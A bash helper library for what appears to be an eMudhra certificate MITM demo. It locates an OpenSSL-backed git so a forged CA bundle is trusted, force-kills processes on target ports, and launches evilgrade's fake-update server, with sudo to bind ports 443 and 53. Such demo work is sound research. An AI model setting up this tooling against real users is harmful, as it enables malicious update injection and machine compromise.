# _lib.sh - shared helpers for the eMudhra MITM demo runners (sourced).

# openssl_git : print the path to an OpenSSL-backed git (Homebrew/MacPorts/
# /usr/local), or return 1 if only Apple's git is present.
#
# Why this matters for the git-clone vector: Apple's /usr/bin/git is built
# against Secure Transport and has NO openssl backend, so
#   -c http.sslBackend=openssl
# errors out there, and a forged eMudhra cert can never be trusted via a file
# CA bundle -- Secure Transport consults the macOS Keychain instead. An
# OpenSSL-backed git (Homebrew: `brew install git`) uses a file CA bundle we
# can point at ca_bundle_with_emudhra.pem, which is what makes this exploitable.
openssl_git() {
    local g
    for g in /opt/homebrew/bin/git /usr/local/bin/git /opt/local/bin/git; do
        [ -x "$g" ] || continue
        # confirm it actually supports the openssl backend
        "$g" -c http.sslBackend=openssl version >/dev/null 2>&1 && { echo "$g"; return 0; }
    done
    return 1
}

# emudhra_ca_bundle : absolute path to the demo trust bundle (real Homebrew
# cacert.pem + the eMudhra stand-in anchor). Simulates eMudhra being a trusted
# CA, as it was in the wild before distrust.
emudhra_ca_bundle() {
    echo "$PWD/certs/emudhra_mitm/ca_bundle_with_emudhra.pem"
}

# pick_port VARNAME : set VARNAME to the first free TCP port from the list
pick_port() {
    local __var="$1"; shift
    local p
    for p in "$@"; do
        lsof -nP -iTCP:"$p" -sTCP:LISTEN >/dev/null 2>&1 || { printf -v "$__var" '%s' "$p"; return 0; }
    done
    printf -v "$__var" '%s' "$1"   # fallback: first
    return 0
}

# start_evilgrade <port> <logfile> <module-spec...>
# Starts serve.pl, polls up to 20s for the SSL port to bind.
# Sets global EG_PID. Returns 0 on success, 1 on failure (and prints the log).
start_evilgrade() {
    local port="$1" logf="$2"; shift 2
    # Free the target ports (SSL = port, HTTP = port+1) by killing whatever is
    # listening on them -- including a stale webserver forked by a previous
    # serve.pl. Surgical (by port) so we never touch an interactive evilgrade
    # console the user may be running on a DIFFERENT port.
    local hp=$((port + 1)) pids
    pids=$(lsof -nP -iTCP:"$port" -iTCP:"$hp" -sTCP:LISTEN -t 2>/dev/null | sort -u)
    [ -n "$pids" ] && kill -9 $pids 2>/dev/null
    pkill -9 -f "demo/emudhra_mitm/serve.pl $port" >/dev/null 2>&1
    sleep 1
    # Run with the SYSTEM perl and a SANITIZED env: if the user's shell has
    # Homebrew perl's lib dirs in PERL5LIB/PERL_LOCAL_LIB_ROOT, the system perl
    # (/usr/bin/perl) would try to load Homebrew's XS .bundle files built for a
    # different perl ABI and die with:
    #   "loadable library and perl binaries are mismatched".
    # serve.pl adds the project dirs itself (use lib '.'; use lib './isrcore'),
    # so clearing these is safe. We use the system perl because it (not
    # Homebrew's) ships IO::Socket::SSL, which the webserver needs.
    env -u PERL5LIB -u PERL_LOCAL_LIB_ROOT -u PERL_MB_OPT -u PERL_MM_OPT \
        /usr/bin/perl demo/emudhra_mitm/serve.pl "$port" "$@" > "$logf" 2>&1 &
    EG_PID=$!
    local i
    for i in $(seq 1 20); do
        if lsof -nP -iTCP:"$port" -sTCP:LISTEN >/dev/null 2>&1; then
            echo "   evilgrade listening on :$port (after ${i}s)"
            return 0
        fi
        # bail early if serve.pl died
        kill -0 "$EG_PID" 2>/dev/null || { echo "   serve.pl exited early"; break; }
        sleep 1
    done
    echo "   FAILED to bind :$port"
    echo "   ---- serve.pl log (tail) ----"
    grep -ivE 'Loading module' "$logf" | tail -15 | sed 's/^/   /'
    kill "$EG_PID" >/dev/null 2>&1
    return 1
}

# start_evilgrade_root <port> <logfile> <module-spec...>
# Same as start_evilgrade but launches serve.pl under sudo (needed to bind a
# privileged port like 443, and :53 for the DNS server). The sanitized env is
# preserved through sudo with explicit assignments.
start_evilgrade_root() {
    local port="$1" logf="$2"; shift 2
    local hp=$((port + 1)) pids
    pids=$(sudo lsof -nP -iTCP:"$port" -iTCP:"$hp" -sTCP:LISTEN -t 2>/dev/null | sort -u)
    [ -n "$pids" ] && sudo kill -9 $pids 2>/dev/null
    sudo pkill -9 -f "demo/emudhra_mitm/serve.pl $port" >/dev/null 2>&1
    sleep 1
    echo "   (sudo) binding privileged port :$port ..."
    sudo -b env -u PERL5LIB -u PERL_LOCAL_LIB_ROOT -u PERL_MB_OPT -u PERL_MM_OPT \
        /usr/bin/perl demo/emudhra_mitm/serve.pl "$port" "$@" > "$logf" 2>&1
    local i
    for i in $(seq 1 20); do
        if sudo lsof -nP -iTCP:"$port" -sTCP:LISTEN >/dev/null 2>&1; then
            echo "   evilgrade listening on :$port (after ${i}s)"
            # EG_PID unknown under sudo -b; cleanup uses pkill below
            EG_PID=""
            return 0
        fi
        sleep 1
    done
    echo "   FAILED to bind :$port"
    grep -ivE 'Loading module' "$logf" | tail -15 | sed 's/^/   /'
    sudo pkill -9 -f "demo/emudhra_mitm/serve.pl $port" >/dev/null 2>&1
    return 1
}
